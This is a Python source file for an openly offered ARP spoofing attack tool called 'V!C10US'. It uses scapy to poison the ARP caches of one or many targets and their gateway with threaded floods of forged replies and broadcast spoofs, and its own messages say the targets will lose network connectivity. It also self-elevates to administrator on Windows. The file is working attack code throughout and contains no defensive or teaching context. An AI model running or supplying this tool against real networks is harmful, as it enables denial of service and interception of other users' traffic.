
# V!C10US is a 100% Working Arp Spoof Attack Tool made by 0725bubz that lets you arp spoof more than one device.


import scapy.all as scapy
import time
import threading
import sys
import os
import signal
import subprocess
import ctypes

# ----- Self-Elevation Check (Windows UAC Bypass) -----
def is_admin():
    """Check if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate():
    """Re-run the script with administrator privileges."""
    if os.name == 'nt' and not is_admin():
        # Re-run the current script with admin rights
        ctypes.windll.shell32.ShellExecuteW(
            None,           # parent window handle
            "runas",        # verb = run as admin
            sys.executable, # python executable
            ' '.join(f'"{arg}"' for arg in sys.argv), # command-line args
            None,           # working directory
            1               # SW_SHOWNORMAL
        )
        sys.exit(0)

# Check and elevate immediately
elevate()

# Set console window title to V!C1OUS
kernel32 = ctypes.windll.kernel32
kernel32.SetConsoleTitleA(b"V!C1OUS")

def clear_screen():
    """Clear the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    """Display the tool banner."""
    print('''
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║ ▄▄    ▄▄     ▄▄        ▄▄▄▄     ▄▄▄       ▄▄▄▄    ▄▄    ▄▄    ▄▄▄▄    ║
║ ▀██  ██▀     ██      ██▀▀▀▀█   █▀██      ██▀▀██   ██    ██  ▄█▀▀▀▀█   ║
║  ██  ██      ██     ██▀          ██     ██    ██  ██    ██  ██▄       ║
║  ██  ██      ██     ██           ██     ██    ██  ██    ██   ▀████▄   ║
║   ████       ▀▀     ██▄          ██     ██    ██  ██    ██       ▀██  ║
║   ████       ▄▄      ██▄▄▄▄█  ▄▄▄██▄▄▄   ██▄▄██   ▀██▄▄██▀  █▄▄▄▄▄█▀  ║
║   ▀▀▀▀       ▀▀        ▀▀▀▀   ▀▀▀▀▀▀▀▀    ▀▀▀▀      ▀▀▀▀     ▀▀▀▀▀    ║
║                                                                       ║
║                      ━ ARP Spoof Attack Tool ━             	        ║
║                       ━  Ctrl + C to exit   ━                         ║
║                                                      		            ║
╚═══════════════════════════════════════════════════════════════════════╝
''')

def get_mac(ip, retries=3):
    """Get MAC address with retries for reliability."""
    for i in range(retries):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        time.sleep(0.5)
    return None

# Global flag for threads
running = True

def spoof_worker(target_ip, spoof_ip, target_mac, delay=0.05):
    """Aggressively send spoofed ARP packets in a tight loop."""
    global running
    packet = scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    while running:
        scapy.sendp(scapy.Ether(dst=target_mac) / packet, verbose=False)
        time.sleep(delay)

def broadcast_spoof_worker(gateway_ip, target_ip, target_mac, gateway_mac, delay=0.1):
    """Send broadcast ARP spoofs to poison the entire subnet's view."""
    global running
    packet1 = scapy.ARP(
        op=2,
        pdst="255.255.255.255",
        hwdst="ff:ff:ff:ff:ff:ff",
        psrc=gateway_ip,
        hwsrc=target_mac
    )
    packet2 = scapy.ARP(
        op=2,
        pdst="255.255.255.255",
        hwdst="ff:ff:ff:ff:ff:ff",
        psrc=target_ip,
        hwsrc=target_mac
    )
    while running:
        scapy.sendp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / packet1, verbose=False)
        scapy.sendp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / packet2, verbose=False)
        time.sleep(delay)

def restore(destination_ip, source_ip, destination_mac, source_mac):
    """Restore ARP cache with correct mappings."""
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    for _ in range(10):
        scapy.sendp(scapy.Ether(dst=destination_mac) / packet, verbose=False)
        time.sleep(0.1)

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully."""
    global running
    print("\n\n[!] Ctrl+C pressed... Stopping attack and restoring ARP caches...")
    running = False
    restore_arp()
    print("[+] ARP Spoof Stopped - Networks restored")
    time.sleep(1.5)
    # Return to start menu with a clean screen
    main_menu()

# Global vars for restoration
targets = []  # List of dicts: {target_ip, target_mac, gateway_ip, gateway_mac}

def restore_arp():
    """Restore all ARP caches."""
    global targets
    for entry in targets:
        print(f"[*] Restoring target {entry['target_ip']} <-> gateway {entry['gateway_ip']}...")
        restore(entry['target_ip'], entry['gateway_ip'], entry['target_mac'], entry['gateway_mac'])
        restore(entry['gateway_ip'], entry['target_ip'], entry['gateway_mac'], entry['target_mac'])

def run_single_attack(target_ip, gateway_ip, our_mac):
    """Run ARP spoof against a single target."""
    global targets

    print("\n[*] Resolving MAC addresses...")
    print(f" [+] Our MAC: {our_mac}")

    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Could not resolve MAC for target {target_ip}")
        return False
    print(f" [+] Target MAC: {target_mac}")

    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        print(f"[!] Could not resolve MAC for gateway {gateway_ip}")
        return False
    print(f" [+] Gateway MAC: {gateway_mac}")

    # Store for restoration
    targets.append({
        'target_ip': target_ip,
        'target_mac': target_mac,
        'gateway_ip': gateway_ip,
        'gateway_mac': gateway_mac
    })

    print("\n[*] Starting aggressive ARP spoofing...")
    print("[*] Target will lose network connectivity shortly")
    print("[*] Press Ctrl+C to stop and restore\n")

    t1 = threading.Thread(target=spoof_worker, args=(target_ip, gateway_ip, target_mac, 0.02), daemon=True)
    t2 = threading.Thread(target=spoof_worker, args=(gateway_ip, target_ip, gateway_mac, 0.02), daemon=True)
    t3 = threading.Thread(target=broadcast_spoof_worker, args=(gateway_ip, target_ip, our_mac, gateway_mac, 0.3), daemon=True)
    t4 = threading.Thread(target=spoof_worker, args=(target_ip, gateway_ip, target_mac, 0.015), daemon=True)

    t1.start()
    t2.start()
    t3.start()
    t4.start()

    print("[*] Sending initial poisoning burst...")
    for _ in range(50):
        scapy.sendp(scapy.Ether(dst=target_mac) / scapy.ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip
        ), verbose=False)
        scapy.sendp(scapy.Ether(dst=gateway_mac) / scapy.ARP(
            op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip
        ), verbose=False)
        time.sleep(0.01)

    return True

def run_multi_attack(targets_list, gateway_ip, our_mac):
    """Run ARP spoof against multiple targets sharing the same gateway."""
    global targets

    print("\n============================================")
    print("[*] Resolving gateway MAC address...")
    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        print(f"[!] Could not resolve MAC for gateway {gateway_ip}")
        return False
    print(f" [+] Gateway MAC: {gateway_mac}")
    print(f" [+] Our MAC: {our_mac}")
    print("============================================\n")

    resolved_targets = []
    for t_ip in targets_list:
        t_ip = t_ip.strip()
        if not t_ip:
            continue
        print("============================================")
        print(f"[*] Resolving MAC for target {t_ip}...")
        t_mac = get_mac(t_ip)
        if not t_mac:
            print(f"[!] Could not resolve MAC for target {t_ip}, skipping...")
            print("============================================")
            continue
        print(f" [+] {t_ip} -> {t_mac}")
        print("============================================")
        resolved_targets.append({'ip': t_ip, 'mac': t_mac})

    if not resolved_targets:
        print("[!] No targets could be resolved. Exiting.")
        return False

    print("============================================")
    print(f"[*] Starting multi-target ARP spoofing against {len(resolved_targets)} target(s)...")
    print("[*] All targets will lose network connectivity shortly")
    print("[*] Press Ctrl+C to stop and restore")
    print("============================================\n")

    # Store for restoration
    for t in resolved_targets:
        targets.append({
            'target_ip': t['ip'],
            'target_mac': t['mac'],
            'gateway_ip': gateway_ip,
            'gateway_mac': gateway_mac
        })

    # Start spoof threads for each target
    threads = []
    for i, t in enumerate(resolved_targets):
        print("============================================")
        print(f"[*] Launching attack threads for target {i+1}: {t['ip']}")
        print("============================================")

        # Spoof target into thinking we're the gateway
        t1 = threading.Thread(target=spoof_worker, args=(t['ip'], gateway_ip, t['mac'], 0.02), daemon=True)
        # Spoof gateway into thinking we're the target
        t2 = threading.Thread(target=spoof_worker, args=(gateway_ip, t['ip'], gateway_mac, 0.02), daemon=True)
        # Broadcast spoof for this target
        t3 = threading.Thread(target=broadcast_spoof_worker, args=(gateway_ip, t['ip'], our_mac, gateway_mac, 0.3), daemon=True)
        # Extra aggressive spoof to target
        t4 = threading.Thread(target=spoof_worker, args=(t['ip'], gateway_ip, t['mac'], 0.015), daemon=True)

        t1.start()
        t2.start()
        t3.start()
        t4.start()
        threads.extend([t1, t2, t3, t4])

    # Initial poisoning burst for all targets
    print("[*] Sending initial poisoning burst to all targets...")
    for _ in range(50):
        for t in resolved_targets:
            scapy.sendp(scapy.Ether(dst=t['mac']) / scapy.ARP(
                op=2, pdst=t['ip'], hwdst=t['mac'], psrc=gateway_ip
            ), verbose=False)
            scapy.sendp(scapy.Ether(dst=gateway_mac) / scapy.ARP(
                op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=t['ip']
            ), verbose=False)
        time.sleep(0.01)

    return True

def main_menu():
    """Show the main menu and handle attack selection."""
    global running, targets

    # Reset global state for a fresh run
    running = True
    targets = []

    # Clear screen and show fresh banner
    clear_screen()
    show_banner()

    # Re-register the signal handler
    signal.signal(signal.SIGINT, signal_handler)

    # Get our MAC address
    our_mac = None
    for iface in scapy.get_if_list():
        if iface and scapy.get_if_hwaddr(iface) != "00:00:00:00:00:00":
            try:
                our_mac = scapy.get_if_hwaddr(iface)
                break
            except:
                continue

    if not our_mac:
        print("[!] Could not determine our MAC address")
        sys.exit(1)

    # Attack mode selection
    print("\n[?] Select attack mode:")
    print("    1 - Single target attack")
    print("    2 - Multi-target attack")
    
    while True:
        try:
            mode = input("\n [?] Enter choice (1 or 2): ").strip()
            if mode in ('1', '2'):
                break
            print("[!] Invalid choice. Please enter 1 or 2.")
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            sys.exit(0)

    if mode == '1':
        # Single target mode
        target_ip = input(" [?] Enter your target IP: ").strip()
        gateway_ip = input(" [?] Enter your gateway's IP: ").strip()

        if not run_single_attack(target_ip, gateway_ip, our_mac):
            main_menu()
            return

    else:
        # Multi-target mode
        gateway_ip = input(" [?] Enter your gateway's IP: ").strip()
        
        print("\n[?] Enter target IPs (one per line, empty line to finish):")
        targets_list = []
        while True:
            try:
                t_ip = input("    > ").strip()
                if not t_ip:
                    break
                targets_list.append(t_ip)
            except KeyboardInterrupt:
                print("\n[!] Exiting...")
                sys.exit(0)

        if not targets_list:
            print("[!] No targets entered. Exiting.")
            sys.exit(1)

        print(f"\n[*] Will attack {len(targets_list)} target(s): {', '.join(targets_list)}")
        confirm = input(" [?] Proceed? (Y/n): ").strip().lower()
        if confirm == 'n':
            print("[!] Aborted.")
            sys.exit(0)

        if not run_multi_attack(targets_list, gateway_ip, our_mac):
            main_menu()
            return

    try:
        while True:
            time.sleep(1)
            target_count = len(targets)
            sys.stdout.write(f"\r [*] Attack active - {target_count} target(s) being flooded... (Ctrl+C to stop)")
            sys.stdout.flush()
    except KeyboardInterrupt:
        signal_handler(None, None)

if __name__ == "__main__":
    main_menu()
